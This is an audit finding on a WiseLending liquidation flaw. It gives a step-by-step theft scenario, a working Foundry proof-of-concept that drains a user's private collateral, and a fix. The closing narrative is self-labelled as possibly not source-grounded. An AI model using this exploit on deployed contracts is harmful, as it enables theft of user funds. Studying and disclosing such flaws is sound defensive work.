---
id: 20826
severity: "High"
---

# Liquidators can pay less than required to completely liquidate the private collateral balance of an uncollateralized position

## Description

When a user deposits in the `WiseLending` contract he can make a private deposit (pure) which allows his deposits not to be used as collateral or a normal deposit. He can also set his position to be collateralized or uncollateralized. If a position is collateralized, the normal deposit can be used as collateral and vice-versa.

When a user uncollateralizes his position, he can only use his private deposit as collateral. If the position becomes liquidatable, it means the private deposit can no longer cover the amount borrowed. In the call to `getFullCollateralETH()` below only the private collateral is returned immediately as full collateral if it is uncollateralized.

[WiseSecurityHelper.sol#L198-L208](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseSecurity/WiseSecurityHelper.sol#L198C1-L208C10)

```solidity
ethCollateral = _getTokensInEth(
    _poolToken,
    WISE_LENDING.getPureCollateralAmount(
        _nftId,
        _poolToken
    )
);

    if (_isUncollateralized(_nftId, _poolToken) == true) {
        return ethCollateral;
    }
```

In a liquidation, the amount to be liquidated is expressed as a percentage of the full collateral. In an uncollateralized position, the full collateral is the private collateral. The `calculateWishPercentage()` call calculates this percentage.

[WiseSecurityHelper.sol#L760-L786](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseSecurity/WiseSecurityHelper.sol#L760-L786)

```solidity
function calculateWishPercentage( uint256 _nftId, address _receiveToken, uint256 _paybackETH, uint256 _maxFeeETH, uint256 _baseRewardLiquidation
) external view returns (uint256)
{
    uint256 feeETH = _checkMaxFee(
        _paybackETH,
        _baseRewardLiquidation,
        _maxFeeETH
    );

    uint256 numerator = (feeETH + _paybackETH)
        * PRECISION_FACTOR_E18;

    uint256 denominator = getFullCollateralETH(
        _nftId,
        _receiveToken
    );

    return numerator / denominator + 1;
}
```

The amount to be liquidated, i.e. the amount the liquidator receives, is calculated in [`_calculateReceiveAmount()`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseCore.sol#L543) using the percentage from `calculateWishPercentage()` and applied to the position’s pure collateral first in line 557 below.

It calculates the percentage of the user’s normal balance to be reduced in line 569 without checking if it is uncollateralized. If the amount it gets, i.e. `potentialPureExtraCashout`, is greater than zero and less than the current private balance (`pureCollateral`) in line 576, it is reduced from the private balance.

[WiseCore.sol#L564-L586](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseCore.sol#L564C1-L586C10)

```solidity
if (pureCollateralAmount[_nftId][_receiveTokens] > 0) {
    receiveAmount = _withdrawPureCollateralLiquidation(
        _nftId,
        _receiveTokens,
        _removePercentage
    );
}

uint256 potentialPureExtraCashout;
uint256 userShares = userLendingData[_nftId][_receiveTokens].shares;
uint256 pureCollateral = pureCollateralAmount[_nftId][_receiveTokens];

if (pureCollateral > 0 && userShares > 0) {
    potentialPureExtraCashout = _calculatePotentialPureExtraCashout(
        userShares,
        _receiveTokens,
        _removePercentage
    );
}

if (potentialPureExtraCashout > 0 && potentialPureExtraCashout <= pureCollateral) {
    _decreasePositionMappingValue(
        pureCollateralAmount,
        _nftId,
        _receiveTokens,
        potentialPureExtraCashout
    );

    _decreaseTotalBareToken(
        _receiveTokens,
        potentialPureExtraCashout
    );

    return receiveAmount + potentialPureExtraCashout;
}
```

The issue is the implementation applies the percentage meant for only the private collateral to both the normal and private collateral. It should reduce only the private collateral, but may also reduce the public collateral and send it to the liquidator.

Here’s how a malicious liquidator can profit and steal user funds:

1. User deposits `$100` worth of WETH in his private balance and `$100` worth of WETH in his normal balance.
2. He uncollateralizes his position and borrows `$70` worth of WBTC.
3. If the price of WBTC he borrowed goes up to `$100`, he can be liquidated.
4. Assuming no liquidation fees, the liquidator pays `$50` WBTC to liquidate `$50` WETH (50%) from the user’s private balance leaving `$50`.
5. The 50% is applied to the user’s public balance giving `$50`. This is also deducted from the private balance leaving `$0` in the private balance.
6. The liquidator ends up paying only `$50` to earn `$50` extra.

A liquidator can set it up to drain the private collateral balance and only pay for a portion of the liquidation. The user ends up losing funds and the protocol’s bad debt increases.

## Proof of Concept

The `testStealPureBalance()` test below shows a liquidator earning more than the amount he paid for liquidation. The test can be put in any test file in the [contracts](https://github.com/code-423n4/2024-02-wise-lending/tree/main/contracts) directory and ran there.

```solidity
pragma solidity =0.8.24;

import "forge-std/Test.sol";

import {WiseLending, PoolManager} from "./WiseLending.sol";
import {TesterWiseOracleHub} from "./WiseOracleHub/TesterWiseOracleHub.sol";
import {PositionNFTs} from "./PositionNFTs.sol";
import {WiseSecurity} from "./WiseSecurity/WiseSecurity.sol";
import {AaveHub} from "./WrapperHub/AaveHub.sol";
import {Token} from "./Token.sol";
import {TesterChainlink} from "./TesterChainlink.sol";

import {IPriceFeed} from "./InterfaceHub/IPriceFeed.sol";
import {IERC20} from "./InterfaceHub/IERC20.sol";
import {IWiseLending} from "./InterfaceHub/IWiseLending.sol";

import {ContractLibrary} from "./PowerFarms/PendlePowerFarmController/ContractLibrary.sol";

contract WiseLendingTest is Test, ContractLibrary {

  WiseLending wiseLending;
  TesterWiseOracleHub oracleHub;
  PositionNFTs positionNFTs;
  WiseSecurity wiseSecurity;
  AaveHub aaveHub;
  TesterChainlink wbtcOracle;

  // users/admin
  address alice = address(1);
  address bob = address(2);
  address charles = address(3);
  address lendingMaster;

  //tokens
  address wbtc;

  function setUp() public {
    lendingMaster = address(11);
    vm.startPrank(lendingMaster);

    address ETH_PRICE_FEED = 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419;
    address UNISWAP_V3_FACTORY = 0x1F98431c8aD98523631AE4a59f267346ea31F984;
    address AAVE_ADDRESS = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
    
    // deploy oracle hub
    oracleHub = new TesterWiseOracleHub(
      WETH,
      ETH_PRICE_FEED,
      UNISWAP_V3_FACTORY
    );
    oracleHub.setHeartBeat(
      oracleHub.ETH_USD_PLACEHOLDER(), // set USD/ETH feed heartbeat
      1
    );

    // deploy position NFT
    positionNFTs = new PositionNFTs(
        "PositionsNFTs",
        "POSNFTS",
        "app.wisetoken.net/json-data/nft-data/"
    );

    // deploy Wiselending contract
    wiseLending = new WiseLending(
      lendingMaster,
      address(oracleHub),
      address(positionNFTs)
    );

    // deploy AaveHub
    aaveHub = new AaveHub(
      lendingMaster,
      AAVE_ADDRESS,
      address(wiseLending)
    );
    
    // deploy Wisesecurity contract
    wiseSecurity = new WiseSecurity(
      lendingMaster,
      address(wiseLending),
      address(aaveHub)
    );

    wiseLending.setSecurity(address(wiseSecurity));
    // set labels
    vm.label(address(wiseLending), "WiseLending");
    vm.label(address(positionNFTs), "PositionNFTs");
    vm.label(address(oracleHub), "OracleHub");
    vm.label(address(wiseSecurity), "WiseSecurity");
    vm.label(alice, "Alice");
    vm.label(bob, "Bob");
    vm.label(charles, "Charles");
    vm.label(wbtc, "WBTC");
    vm.label(WETH, "WETH");

    // create tokens, create TestChainlink oracle, add to oracleHub
    (wbtc, wbtcOracle) = _setupToken(18, 17 ether);
    oracleHub.setHeartBeat(wbtc, 1);
    wbtcOracle.setRoundData(0, block.timestamp -1);
    // setup WETH on oracle hub
    oracleHub.setHeartBeat(WETH, 60 minutes);
    oracleHub.addOracle(WETH, IPriceFeed(ETH_PRICE_FEED), new address[](0));
    
    // create pools
    wiseLending.createPool(
      PoolManager.CreatePool({
        allowBorrow: true,
        poolToken: wbtc, // btc
        poolMulFactor: 17500000000000000,
        poolCollFactor: 805000000000000000,
        maxDepositAmount: 1800000000000000000000000
      })
    );

    wiseLending.createPool(
      PoolManager.CreatePool({
        allowBorrow: true,
        poolToken: WETH, // btc
        poolMulFactor: 17500000000000000,
        poolCollFactor: 805000000000000000,
        maxDepositAmount: 1800000000000000000000000
      })
    );
  }

  function _setupToken(uint decimals, uint value) internal returns (address token, TesterChainlink oracle) {
    Token _token = new Token(uint8(decimals), alice); // deploy token
    TesterChainlink _oracle = new TesterChainlink( // deploy oracle
      value, 18
    ); 
    oracleHub.addOracle( // add oracle to oracle hub
      address(_token), 
      IPriceFeed(address(_oracle)), 
      new address[](0)
    );

    return (address(_token), _oracle);
  }

  function testStealPureBalance() public {
    // deposit WETH in private and public balances for Alice's NFT
    vm.startPrank(alice);
    deal(WETH, alice, 100 ether);
    IERC20(WETH).approve(address(wiseLending), 100 ether);
    uint aliceNft = positionNFTs.reservePosition();
    wiseLending.depositExactAmount(aliceNft, WETH, 50 ether);
    wiseLending.solelyDeposit(aliceNft, WETH, 50 ether);
    
    // deposit for Bob's NFT to provide WBTC liquidity
    vm.startPrank(bob);
    deal(wbtc, bob, 100 ether);
    IERC20(wbtc).approve(address(wiseLending), 100 ether);
    wiseLending.depositExactAmountMint(wbtc, 100 ether);

    // Uncollateralize Alice's NFT position to allow only private(pure)
    // balance to be used as collateral
    vm.startPrank(alice);
    wiseLending.unCollateralizeDeposit(aliceNft, WETH);
    (, , uint lendCollFactor) = wiseLending.lendingPoolData(WETH);
    uint usableCollateral = 50 ether *  lendCollFactor * 95e16 / 1e36 ;
    
    // alice borrows
    uint borrowable = oracleHub.getTokensFromETH(wbtc, usableCollateral) - 1000;
    uint paybackShares = wiseLending.borrowExactAmount(aliceNft, wbtc, borrowable);

    vm.startPrank(lendingMaster);
    // increase the price of WBTC to make Alice's position liquidatable
    wbtcOracle.setValue(20 ether); 
    
    // let charles get WBTC to liquidate Alice
    vm.startPrank(charles);
    uint charlesNft  = positionNFTs.reservePosition();
    uint paybackAmount = wiseLending.paybackAmount(wbtc, paybackShares);
    deal(wbtc, charles, paybackAmount);
    IERC20(wbtc).approve(address(wiseLending), paybackAmount);

    uint wbtcBalanceBefore = IERC20(wbtc).balanceOf(charles);
    uint wethBalanceBefore = IERC20(WETH).balanceOf(charles);
    // charles liquidates 40% of the shares to ensure he can reduce the pure collateral balance twice
    wiseLending.liquidatePartiallyFromTokens(aliceNft, charlesNft, wbtc, WETH, paybackShares * 40e16/1e18);

    uint wbtcBalanceChange = wbtcBalanceBefore - IERC20(wbtc).balanceOf(charles);
    uint wethBalanceChange = IERC20(WETH).balanceOf(charles) - wethBalanceBefore;
    
    // The amount of WETH Charles got is 2x the amount of WBTC he paid plus fees (10% of amount paid)
    // WBTC paid plus fees = 110% * wbtcBalanceChange
    // x2WBTCChangePlusFees = 2 * WBTC paid plus fees
    uint x2WBTCChangePlusFees = oracleHub.getTokensInETH(wbtc, 11e17 * wbtcBalanceChange / 1e18) * 2;
    
    assertApproxEqAbs(wethBalanceChange, x2WBTCChangePlusFees, 200);
  }
}
```

## Recommendation

To ensure the code does not also consider the normal balance at all we can check if the position is uncollateralized early. Currently, this check is done but is done too late in the `_calculateReceiveAmount()` function. We can fix it by moving the check.

[WiseCore.sol#L560-L594](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseCore.sol#L560C17-L594)

```solidity
        if (userLendingData[_nftId][_receiveTokens].unCollateralized == true) {
            return receiveAmount;
        }

        uint256 potentialPureExtraCashout;
        uint256 userShares = userLendingData[_nftId][_receiveTokens].shares;
        uint256 pureCollateral = pureCollateralAmount[_nftId][_receiveTokens];
        
        ...
    
        if (userLendingData[_nftId][_receiveTokens].unCollateralized == true) {
            return receiveAmount;
        }
    
        return _withdrawOrAllocateSharesLiquidation(
            _nftId,
            _nftIdLiquidator,
```

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability originates from an incorrect handling of uncollateralized positions during liquidation. In the WiseLending protocol a user can separate his deposits into a private (pure) balance that is excluded from collateral calculations and a normal balance that can be used as collateral when the position is marked as collateralized. When a user explicitly uncollateralizes his position, only the private balance should be considered as collateral for liquidation. The contract computes the liquidation percentage based on the full collateral returned by getFullCollateralETH, which correctly reports only the private balance for an uncollateralized position. However, later in the internal function that determines the amount the liquidator receives, the same percentage is applied to both the private balance and the normal balance because the check for an uncollateralized flag is performed too late. As a result, the liquidator can claim a portion of the normal balance in addition to the private balance while only paying for the private portion. An attacker can trigger a liquidation on an uncollateralized, under‑collateralized position, set the removal percentage such that the calculated extra cash‑out from the normal balance is positive, and then drain the private balance without covering the full value of the assets taken. In practice a user may deposit equal amounts into private and normal balances, borrow against the private balance, and after a price move become liquidatable. The liquidator pays only the amount required to liquidate the private collateral (e.g., 50 % of the private balance) but receives an additional amount from the normal balance, effectively stealing funds. The impact is a loss of private funds for the user and an increase in protocol bad debt. The bug manifests only when a position is uncollateralized and liquidatable; collateralized positions are unaffected. It was discovered during a formal audit by reproducing the scenario in a unit test that showed the liquidator earning more than the amount paid. The issue is subtle because the liquidation percentage calculation appears correct and the extra cash‑out path is hidden behind internal bookkeeping, making it easy to overlook. The proper fix is to move the uncollateralized check to the beginning of the receive‑amount calculation so that the extra cash‑out logic is bypassed entirely for uncollateralized positions, ensuring that only the private balance can be reduced during liquidation.
